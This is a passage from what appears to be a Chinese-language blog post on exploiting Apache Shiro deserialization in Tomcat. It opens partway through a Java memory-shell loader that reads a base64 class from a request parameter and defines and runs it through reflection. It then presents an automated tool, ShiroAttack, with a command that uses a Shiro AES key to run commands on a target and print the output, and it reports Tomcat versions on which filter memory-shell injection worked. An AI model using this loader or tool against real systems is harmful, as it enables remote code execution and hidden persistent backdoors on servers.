                            obj = getFieldValue(getFieldValue(getFieldValue(obj, "this$0"), "handler"), "global");
                        } catch (Exception e) {
                            continue;
                        }

                        java.util.List processors = (java.util.List) getFieldValue(obj,"processors");

                        for (int n = 0; n < processors.size(); ++n) {
                            Object processor = processors.get(n);
                            obj = getFieldValue(processor, "req");

                            Object conreq = obj.getClass().getMethod("getNote", new Class[]{int.class}).invoke(obj, new Object[]{new Integer(1)});

                            String c = (String) conreq.getClass().getMethod("getParameter", new Class[]{String.class}).invoke(conreq, new Object[]{new String("class")});

                            if (c != null && !c.isEmpty()) {
                                byte[] bytecodes = new sun.misc.BASE64Decoder().decodeBuffer(c);

                                java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                                defineClassMethod.setAccessible(true);

                                Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), new Object[]{bytecodes, new Integer(0), new Integer(bytecodes.length)});

                                cc.newInstance().equals(conreq);
                                flag = true;
                            }
                            if (flag) {
                                break;
                            }
                        }
                        if (flag) {
                            break;
                        }
                    }
                }
            }
        }
    }

}
```

## 工具自动化利用

最终，根据以上所有，编写一个自动化利用的工具 ShiroAttack。

- [https://github.com/0xf4n9x/ShiroMemShellAttack](https://github.com/0xf4n9x/ShiroMemShellAttack)

### TomcatEcho

Tomcat 通用回显，已在 Tomcat 7.0.0、7.0.10、7.0.109、8.5.54、9.0.10 版本上测试攻击成功，但 6.0.53 和 10.0.0 版本上攻击失败。

```shell
$ java -jar ShiroAttack.jar -p http://127.0.0.1:8080 -u http://192.168.1.100:8089 -k kPH+bIxk5D2deZiIxcaaaA== -m CBC -a TomcatEcho -c pwd

   _____ __    _            ___   __  __             __
  / ___// /_  (_)________  /   | / /_/ /_____ ______/ /__
  \__ \/ __ \/ / ___/ __ \/ /| |/ __/ __/ __ `/ ___/ //_/
 ___/ / / / / / /  / /_/ / ___ / /_/ /_/ /_/ / /__/ ,<
/____/_/ /_/_/_/   \____/_/  |_\__/\__/\__,_/\___/_/|_|

[*] URL: http://192.168.1.100:8089
[*] Proxy: http://127.0.0.1:8080
[*] Shiro Key: kPH+bIxk5D2deZiIxcaaaA==
[*] Encryption mode: AES-CBC
[*] Type of attack: TomcatEcho
[*] Timeout: 20s
[*] Command: pwd

/opt/apache-tomcat/apache-tomcat-7.0.0/bin
```

### FilterMemShell

Filter 型内存马注入，已在 Tomcat 7.0.10、7.0.109、8.5.54、9.0.10、9.0.70 版本上测试攻击成功，但 6.0.53、7.0.0 和 10.0.0 版本上攻击失败。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/b6c5c0c9-cc86-4460-b110-89d422126822/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=7a0160cc7d0ce154df3d14cccf3b95b2282b927a6b63bd41850406ff5e538b47&X-Amz-SignedHeaders=host&x-id=GetObject)

## 参考

[https://0xf4n9x.github.io/tomcat-filter-memshell](https://0xf4n9x.github.io/tomcat-filter-memshell)

[https://0xf4n9x.github.io/java-classloader](https://0xf4n9x.github.io/java-classloader.html)

[https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A](https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A)

[https://xz.aliyun.com/t/7348](https://xz.aliyun.com/t/7348)

[https://github.com/KpLi0rn/shiro_attack](https://github.com/KpLi0rn/shiro_attack)

[https://github.com/0xf4n9x/ShiroAttack](https://github.com/0xf4n9x/ShiroAttack)
